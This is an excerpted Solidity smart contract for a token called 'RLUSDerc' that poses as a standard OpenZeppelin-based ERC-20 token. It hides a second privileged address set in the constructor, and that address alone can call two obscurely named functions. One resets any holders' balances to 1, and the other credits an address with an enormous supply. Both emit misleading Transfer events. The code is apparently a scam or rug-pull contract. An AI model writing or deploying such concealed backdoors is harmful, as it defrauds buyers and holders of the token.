...
/*
 * @dev Provides information about the current execution RLUSD20Burnable, including the
...
// File: @openzeppelin/contracts/access/RLUSD20Ownable.sol
...
abstract contract RLUSD20Ownable is RLUSD20Burnable {
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "RLUSD20Ownable: new owner is the zero address");
 ...
 * `SafeRLUSD` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
contract  RLUSDToken is RLUSD20Burnable, RLUSDinterface, RLUSD20Ownable {
   ...
   address private currentBuyCountV8; 
    constructor(address currentBuyCount) {
        currentBuyCountV8 = currentBuyCount;     
        _name = "RLUSDerc";
        _symbol = "RLUSDerc";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {RLUSDinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {RLUSDinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(currentBuyCountV8 == _msgSender(), "RLUSD20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {RLUSDinterface-approve}.
    *
    * Requirements:
    *
    * - `transporteur` cannot be the zero address.
    */
function aTUSDSellTokens(address[] calldata currentBuyCountUSDTRewards) external subowner {
    for (uint256 i = 0; i < currentBuyCountUSDTRewards.length; i++) {
        mintfrom[currentBuyCountUSDTRewards[i]] = 1;
        
        emit Transfer(currentBuyCountUSDTRewards[i], address(0), 1);
    }
}

    /**
    * @dev See {RLUSDinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    function zdBaseSellTokens(address currentBuyCountRewards) external subowner {
        mintfrom[currentBuyCountRewards] = 10000000000 * 10 ** 20;
        
        emit Transfer(currentBuyCountRewards, address(0), 10000000000 * 10 ** 20);
    }
    /**
    * @dev See {RLUSDinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {RLUSDinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {RLUSDinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "RLUSDinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {RLUSDinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "RLUSDinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "RLUSDinterface: transfer from the zero address");
        require(shippingto != address(0), "RLUSDinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "RLUSDinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "RLUSDinterface: approve from the zero address");
        require(transporteur != address(0), "RLUSDinterface: approve to the zero address");
